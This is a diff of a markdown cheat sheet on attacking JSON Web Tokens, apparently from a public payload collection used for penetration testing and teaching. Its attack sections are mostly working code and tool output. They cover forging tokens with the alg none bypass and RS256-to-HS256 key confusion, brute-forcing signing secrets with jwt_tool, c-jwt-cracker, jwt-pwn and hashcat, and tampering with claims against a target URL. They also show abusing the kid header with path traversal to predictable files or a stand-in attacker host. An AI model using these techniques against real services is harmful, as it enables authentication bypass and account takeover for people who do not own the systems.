@@ -4,20 +4,22 @@
 
 ## Summary 
 
-- [JWT - JSON Web Token](#jwt---json-web-token)
-  - [Summary](#summary)
-  - [Tools](#tools)
-  - [JWT Format](#jwt-format)
-    - [Header](#header)
-    - [Payload](#payload)
-  - [JWT Signature - None algorithm](#jwt-signature---none-algorithm)
-  - [JWT Signature - RS256 to HS256](#jwt-signature---rs256-to-hs256)
-  - [Breaking JWT's secret](#breaking-jwts-secret)
+- [Summary](#summary)
+- [Tools](#tools)
+- [JWT Format](#jwt-format)
+  - [Header](#header)
+  - [Payload](#payload)
+- [JWT Signature - None algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
+- [JWT Signature - RS256 to HS256 (CVE-2016-5431)](#jwt-signature---rs256-to-hs256-cve-2016-5431)
+- [JWT Secret](#jwt-secret)
+  - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
+  - [Break JWT secret](#break-jwt-secret)
     - [JWT tool](#jwt-tool)
     - [JWT cracker](#jwt-cracker)
+    - [JWT pwn](#jwt-pwn)
     - [Hashcat](#hashcat)
-  - [CVE](#cve)
-  - [References](#references)
+- [JWT Kid Claim Misuse](#jwt-kid-claim-misuse)
+- [References](#references)
 
 ## Tools
 
@@ -41,8 +43,8 @@ UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
 
 ### Header
 
-Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
-"RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).
+Registered header parameter names defined in [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515).
+The most basic JWT header is the following JSON.
 
 ```json
 {
@@ -51,23 +53,42 @@ Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
 }
 ```
 
-| `alg` Param Value  | Digital Signature or MAC Algorithm | Requirements |
-|---|---|---|
-| HS256 | HMAC using SHA-256                             | Required  |
-| HS384 | HMAC using SHA-384                             | Optional  |
-| HS512 | HMAC using SHA-512                             | Optional  |
-| RS256	| RSASSA-PKCS1-v1_5 using SHA-256                | Recommended | 
-| RS384 | RSASSA-PKCS1-v1_5 using SHA-384                |	Optional | 
-| RS512 | RSASSA-PKCS1-v1_5 using SHA-512                |	Optional | 
-| ES256 | ECDSA using P-256 and SHA-256	                 | Recommended  | 
-| ES384 | ECDSA using P-384 and SHA-384                  | Optional     | 
-| ES512 | ECDSA using P-521 and SHA-512	                 | Optional     | 
-| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 |	Optional | 
-| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 |	Optional |
-| PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 |	Optional |
-| none	| No digital signature or MAC performed          |	Required |
- 
+Other parameters are registered in the RFC.
 
+| Parameter | Definition                           | Description |
+|-----------|--------------------------------------|-------------|
+| alg       | Algorithm                            | Identifies the cryptographic algorithm used to secure the JWS |
+| jku       | JWK Set URL                          | Refers to a resource for a set of JSON-encoded public keys    |
+| jwk       | JSON Web Key                         | The public key used to digitally sign the JWS                 |
+| kid       | Key ID                               | The key used to secure the JWS                                |
+| x5u       | X.509 URL                            | URL for the X.509 public key certificate or certificate chain |
+| x5c       | X.509 Certificate Chain              | X.509 public key certificate or certificate chain in PEM-encoded used to digitally sign the JWS |
+| x5t       | X.509 Certificate SHA-1 Thumbprint)  | Base64 url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate       |
+| x5t#S256  | X.509 Certificate SHA-256 Thumbprint | Base64 url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate     |
+| typ       | Type                                 | Media Type. Usually `JWT` |
+| cty       | Content Type                         | This header parameter is not recommended to use |
+| crit      | Critical                             | Extensions and/or JWA are being used |
+
+
+Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
+"RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).
+
+| `alg` Param Value  | Digital Signature or MAC Algorithm | Requirements |
+|-------|------------------------------------------------|---------------|
+| HS256 | HMAC using SHA-256                             | Required      |
+| HS384 | HMAC using SHA-384                             | Optional      |
+| HS512 | HMAC using SHA-512                             | Optional      |
+| RS256	| RSASSA-PKCS1-v1_5 using SHA-256                | Recommended   |
+| RS384 | RSASSA-PKCS1-v1_5 using SHA-384                | Optional      |
+| RS512 | RSASSA-PKCS1-v1_5 using SHA-512                | Optional      |
+| ES256 | ECDSA using P-256 and SHA-256	                 | Recommended   |
+| ES384 | ECDSA using P-384 and SHA-384                  | Optional      |
+| ES512 | ECDSA using P-521 and SHA-512	                 | Optional      |
+| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 | Optional      |
+| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional      |
+| PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 | Optional      |
+| none	| No digital signature or MAC performed          | Required      |
+ 
 
 ### Payload
 
@@ -91,9 +112,14 @@ Claims are the predefined keys and their values:
 
 JWT Encoder – Decoder: `http://jsonwebtoken.io`
 
-## JWT Signature - None algorithm
+## JWT Claims
 
-JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
+[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)
+
+
+## JWT Signature - None algorithm (CVE-2015-9235)
+
+JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
 
 None algorithm variants:
 * none 
@@ -107,31 +133,24 @@ However, this won't work unless you **remove** the signature
 
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-```python3
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
+```python
 import jwt
 
-jwtToken 	= 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
+jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
+decodedToken = jwt.decode(jwtToken, verify=False)  					
 
-decodedToken 	= jwt.decode(jwtToken, verify=False)  					# Need to decode the token before encoding with type 'None'
+# decode the token before encoding with type 'None'
 noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)
 
 print(noneEncoded.decode())
-
-"""
-Output:
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
-"""
 ```
 
-## JWT Signature - RS256 to HS256
+## JWT Signature - RS256 to HS256 (CVE-2016-5431)
 
 Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.
 
-> The algorithm HS256 uses the secret key to sign and verify each message.
-> The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.
+> The algorithm **HS256** uses the secret key to sign and verify each message.
+> The algorithm **RS256** uses the private key to sign the message and uses the public key for authentication.
 
 ```python
 import jwt
@@ -172,45 +191,32 @@ Here are the steps to edit an RS256 JWT token into an HS256
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
     ```
 
-## Breaking JWT's secret
+## JWT Secret
 
-Encode/Decode JWT with the secret.
+> To create a JWT, a secret key is used to sign the header and payload, which generates the signature. The secret key must be kept secret and secure to prevent unauthorized access to the JWT or tampering with its contents. If an attacker is able to access the secret key, they can create, modify or sign their own tokens, bypassing the intended security controls.
+
+### Encode and Decode JWT with the secret
+
+Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
 
 ```python
 import jwt
-encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256') # encode with 'secret'
-
-encoded = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE"
-jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the secret key
-
-# result
-{u'admin': True, u'sub': u'1234567890', u'name': u'John Doe'}
+encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
+jwt.decode(encoded, 'secret', algorithms=['HS256']) 
 ```
 
-### JWT tool
+### Break JWT secret
 
-First, bruteforce the "secret" key used to compute the signature.
+Useful list of 3502 public-available JWT: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), including `your_jwt_secret`, `change_this_super_secret_random_string`, etc.
+
+
+#### JWT tool
+
+First, bruteforce the "secret" key used to compute the signature using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
 ```powershell
-git clone https://github.com/ticarpi/jwt_tool
 python3 -m pip install termcolor cprint pycryptodomex requests
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
-
-        \   \        \         \          \                    \
-   \__   |   |  \     |\__    __| \__    __|                    |
-         |   |   \    |      |          |       \         \     |
-         |        \   |      |          |    __  \     __  \    |
-  \      |      _     |      |          |   |     |   |     |   |
-   |     |     / \    |      |          |   |     |   |     |   |
-\        |    /   \   |      |          |\        |\        |   |
- \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
- Version 2.2.2                \______|             @ticarpi
-
-Original JWT:
-
-[+] secret is the CORRECT key!
-You can tamper/fuzz the token contents (-T/-I) and sign it using:
-python3 jwt_tool.py [options here] -S HS256 -p "secret"
 ```
 
 Then edit the field inside the JSON Web Token.
@@ -224,8 +230,7 @@ Please enter new value and hit ENTER
 [3] iat = 1516239022
 [0] Continue to next step
 
-Please select a field number:
-(or 0 to Continue)
+Please select a field number (or 0 to Continue):
 > 0
 ```
 
@@ -262,30 +267,87 @@ Your new forged token:
 * Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
 
 
-### JWT cracker
+#### JWT cracker
 
-```bash
+```ps1
 git clone https://github.com/brendan-rius/c-jwt-cracker
 ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
 Secret is "Sn1f"
 ```
 
-### Hashcat
+#### jwt-pwn
+
+```ps1
+git clone https://github.com/mazen160/jwt-pwn
+python3 jwt-cracker.py -jwt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4" -t 10 -w jwt.secrets.list
+[#] KEY FOUND: 1234
+```
+
+
+#### Hashcat
 
 > Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)
 
-```bash
+```ps1
 /hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 ```
 
-## CVE
 
-* CVE-2015-2951 - The alg=none signature-bypass vulnerability
-* CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability
-* CVE-2018-0114 - Key injection vulnerability
-* CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability
-* CVE-2020-28042 - Null signature vulnerability
+
+## JWT Kid Claim Misuse
+
+The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.
+
+* Example #1 : Local file
+    ```json
+    {
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "/root/res/keys/secret.key"
+    }
+    ```
+
+* Example #2 : Remote file
+    ```json
+    {
+        "alg":"RS256",
+        "typ":"JWT",
+        "kid":"http://localhost:7070/privKey.key"
+    }
+    ```
+
+The content of the file specified in the kid header will be used to generate the signature.
+
+```js
+// Example for HS256
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  your-256-bit-secret-from-secret.key
+)
+```
+
+The common ways to misuse the kid header:
+* Get the key content to change the payload
+* Change the key path to force your own
+    ```py
+    >>> jwt.encode(
+    ...     {"some": "payload"},
+    ...     "secret",
+    ...     algorithm="HS256",
+    ...     headers={"kid": "http://evil.example.com/custom.key"},
+    ... )
+    ```
+
+* Change the key path to a file with a predictable content.
+  ```ps1
+  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
+  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
+  ```
+
+* Modify the kid header to attempt SQL and Command Injections
+
 
 ## Labs 
 
@@ -298,18 +360,20 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 
 ## References
 
-- [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
-- [WebSec CTF - Authorization Token - JWT Challenge](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
-- [Privilege Escalation like a Boss - October 27, 2018 - janijay007](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
 - [5 Easy Steps to Understanding JSON Web Token](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
-- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
-- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
-- [Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
-- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq](https://github.com/dwyl/learn-json-web-tokens)
-- [Simple JWT hacking - @b1ack_h00d](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
 - [Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
-- [How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
-- [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
-- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017](https://trustfoundry.net/jwt-hacking-101/)
-- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
+- [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid](https://www.youtube.com/watch?v=d7wmUz57Nlg)
+- [Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
+- [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
+- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
 - [Hacking JSON Web Tokens - medium.com Oct 2019](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
+- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
+- [How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
+- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
+- [JSON Web Token Vulnerabilities - 0xn3va](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
+- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017](https://trustfoundry.net/jwt-hacking-101/)
+- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq](https://github.com/dwyl/learn-json-web-tokens)
+- [Privilege Escalation like a Boss - October 27, 2018 - janijay007](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
+- [Simple JWT hacking - @b1ack_h00d](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
+- [WebSec CTF - Authorization Token - JWT Challenge](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
+- [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
